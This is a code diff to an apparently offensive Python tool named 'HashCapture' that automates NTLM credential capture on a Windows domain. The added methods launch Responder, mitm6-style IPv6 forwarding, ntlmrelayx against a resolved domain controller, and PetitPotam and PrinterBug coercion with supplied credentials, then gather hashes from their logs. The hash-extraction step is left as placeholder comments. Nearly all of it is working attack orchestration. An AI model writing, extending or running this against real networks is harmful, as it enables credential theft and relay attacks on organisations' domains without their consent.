@@ -70,10 +70,155 @@ class HashCapture:
         signal.signal(signal.SIGINT, self.signal_handler)
         signal.signal(signal.SIGTERM, self.signal_handler)
 
+    def get_local_ip(self):
+        """Get the local IP address of the specified interface"""
+        try:
+            # Get all addresses for the interface
+            addrs = netifaces.ifaddresses(self.interface)
+            
+            # Look for IPv4 address
+            if netifaces.AF_INET in addrs:
+                return addrs[netifaces.AF_INET][0]['addr']
+                
+            self.logger.error(f"No IPv4 address found for interface {self.interface}")
+            return None
+        except Exception as e:
+            self.logger.error(f"Error getting local IP: {e}")
+            return None
+
+    def signal_handler(self, signum, frame):
+        """Handle interruption signals"""
+        self.logger.info(f"Received signal {signum}")
+        self.cleanup()
+        sys.exit(0)
+
+    def process_output(self, process, logger, prefix=""):
+        """Process and log output from a subprocess"""
+        try:
+            for line in iter(process.stdout.readline, ''):
+                if self.stop_event.is_set():
+                    break
+                if line:
+                    line = line.strip()
+                    if line:
+                        logger.debug(f"{prefix}: {line}")
+        except Exception as e:
+            logger.error(f"Error processing output: {e}")
+
+    def setup_ipv6_forwarding(self):
+        """Enable IPv6 forwarding"""
+        try:
+            # Save original IPv6 forwarding state
+            with open('/proc/sys/net/ipv6/conf/all/forwarding', 'r') as f:
+                self.original_ipv6_forward = f.read().strip()
+
+            # Enable IPv6 forwarding
+            subprocess.run(["sysctl", "-w", "net.ipv6.conf.all.forwarding=1"], check=True)
+            return True
+        except Exception as e:
+            self.logger.error(f"Failed to setup IPv6 forwarding: {e}")
+            return False
+
+    def create_targets_file(self):
+        """Create targets file for attacks if domain is specified"""
+        if not self.domain:
+            return True
+        
+        try:
+            # Resolve domain controller IP
+            self.dc_ip = socket.gethostbyname(f"dc.{self.domain}")
+            
+            # Create targets file
+            with open('targets.txt', 'w') as f:
+                f.write(f"{self.dc_ip}\n")
+            return True
+        except Exception as e:
+            self.logger.error(f"Error creating targets file: {e}")
+            return False
+
+    def start_ntlmrelay(self):
+        """Start ntlmrelay attack"""
+        try:
+            cmd = [
+                "ntlmrelayx.py",
+                "-tf", "targets.txt",
+                "-smb2support",
+                "--no-http-server",
+                "--no-wcf-server"
+            ]
+            
+            if self.domain:
+                cmd.extend(["-domain", self.domain])
+            
+            process = Popen(cmd, stdout=PIPE, stderr=STDOUT, universal_newlines=True)
+            self.processes["ntlmrelay"] = process
+            
+            self.process_output(process, self.attack_loggers["ntlmrelay"], "NTLMRELAY")
+        except Exception as e:
+            self.logger.error(f"Error in start_ntlmrelay: {e}")
+
+    def start_responder(self):
+        """Start Responder"""
+        try:
+            cmd = [
+                "responder",
+                "-I", self.interface,
+                "-wrf"
+            ]
+            
+            process = Popen(cmd, stdout=PIPE, stderr=STDOUT, universal_newlines=True)
+            self.processes["responder"] = process
+            
+            self.process_output(process, self.attack_loggers["responder"], "RESPONDER")
+        except Exception as e:
+            self.logger.error(f"Error in start_responder: {e}")
+
+    def start_petitpotam(self):
+        """Start PetitPotam attack"""
+        if not self.domain or not self.dc_ip:
+            return
+        
+        try:
+            cmd = [
+                "petitpotam.py",
+                "-d", self.domain,
+                "-u", self.creds.split(':')[0] if self.creds else "anonymous",
+                "-p", self.creds.split(':')[1] if self.creds else "",
+                self.local_ip,
+                self.dc_ip
+            ]
+            
+            process = Popen(cmd, stdout=PIPE, stderr=STDOUT, universal_newlines=True)
+            self.processes["petitpotam"] = process
+            
+            self.process_output(process, self.attack_loggers["petitpotam"], "PETITPOTAM")
+        except Exception as e:
+            self.logger.error(f"Error in start_petitpotam: {e}")
+
+    def start_printerbug(self):
+        """Start PrinterBug attack"""
+        if not self.domain or not self.dc_ip:
+            return
+        
+        try:
+            cmd = [
+                "printerbug.py",
+                "-d", self.domain,
+                "-u", self.creds.split(':')[0] if self.creds else "anonymous",
+                "-p", self.creds.split(':')[1] if self.creds else "",
+                f"{self.domain}/{self.dc_ip}",
+                self.local_ip
+            ]
+            
+            process = Popen(cmd, stdout=PIPE, stderr=STDOUT, universal_newlines=True)
+            self.processes["printerbug"] = process
+            
+            self.process_output(process, self.attack_loggers["printerbug"], "PRINTERBUG")
+        except Exception as e:
+            self.logger.error(f"Error in start_printerbug: {e}")
+
     def release_dns_port(self):
-        """
-        Attempt to release port 53 by stopping/killing potential conflicting services
-        """
+        """Attempt to release port 53 by stopping/killing potential conflicting services"""
         try:
             # Stop systemd-resolved
             subprocess.run(["sudo", "systemctl", "stop", "systemd-resolved"], check=False)
@@ -149,6 +294,59 @@ class HashCapture:
             self.logger.error(f"Error in start_mitm6: {e}")
             return False
 
+    def extract_hashes(self):
+        """Extract and process captured hashes"""
+        try:
+            # Process Responder logs
+            responder_log = Path("/usr/share/responder/logs")
+            if responder_log.exists():
+                self.logger.info("Processing Responder logs...")
+                # Add your hash extraction logic here
+            
+            # Process NTLM Relay logs
+            relay_log = Path("./relay.txt")
+            if relay_log.exists():
+                self.logger.info("Processing NTLM Relay logs...")
+                # Add your hash extraction logic here
+                
+        except Exception as e:
+            self.logger.error(f"Error extracting hashes: {e}")
+
+    def cleanup(self):
+        """Cleanup resources and restore system state"""
+        try:
+            # Stop all processes
+            for name, process in self.processes.items():
+                try:
+                    process.terminate()
+                    process.wait(timeout=5)
+                except Exception as e:
+                    self.logger.warning(f"Error stopping {name}: {e}")
+                    try:
+                        process.kill()
+                    except:
+                        pass
+
+            # Restore IPv6 forwarding state
+            if self.original_ipv6_forward is not None:
+                try:
+                    with open('/proc/sys/net/ipv6/conf/all/forwarding', 'w') as f:
+                        f.write(self.original_ipv6_forward)
+                except Exception as e:
+                    self.logger.error(f"Error restoring IPv6 forwarding: {e}")
+
+            # Additional cleanup tasks
+            for file in ['targets.txt']:
+                try:
+                    if os.path.exists(file):
+                        os.remove(file)
+                except Exception as e:
+                    self.logger.warning(f"Error removing {file}: {e}")
+
+            self.logger.info("Cleanup completed")
+        except Exception as e:
+            self.logger.error(f"Error in cleanup: {e}")
+
     def run(self):
         """Main execution flow running all attacks"""
         self.logger.info("Starting Hash Capture Operation")
@@ -191,7 +389,7 @@ class HashCapture:
             responder_thread.start()
             time.sleep(self.duration)
             self.stop_event.set()
-            responder_thread.join()
+            responder_thread.join(timeout=5)
             self.stop_event.clear()
 
             # Wait before starting MITM6
@@ -205,7 +403,7 @@ class HashCapture:
             mitm6_thread.start()
             time.sleep(self.duration)
             self.stop_event.set()
-            mitm6_thread.join()
+            mitm6_thread.join(timeout=5)
             self.stop_event.clear()
 
             self.logger.info("All attacks completed.")
@@ -222,7 +420,6 @@ class HashCapture:
         
         return True
 
-# Rest of the existing code remains the same
 def main():
     parser = argparse.ArgumentParser(description="Hash Capture Tool")
     parser.add_argument("-i", "--interface", required=True, help="Network interface to use")
